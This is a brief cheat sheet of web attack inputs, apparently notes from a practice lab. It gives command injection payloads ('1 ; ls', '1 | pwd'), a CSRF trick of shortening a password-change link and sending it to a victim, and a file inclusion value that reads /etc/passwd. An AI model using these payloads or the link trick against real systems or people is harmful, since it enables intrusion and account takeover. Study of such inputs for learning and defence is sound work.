#### Command Injection
```bash
# List contents
1 ; ls or 1 | ls
1 ; pwd or 1 | pwd
&
; -> display both results
| -> display result of 2nd command
```

#### CSRF
```bash
Attacker can easily change the password of vicitm , of victim clicks on a linl

Copy the link after changing password -> copy, paste in  notepad and edit password.
shorten the url
and send it to victim.
once he execute that link password will change automatically
```

#### File inclusion
```bash
page_id=/etc/passwd
```

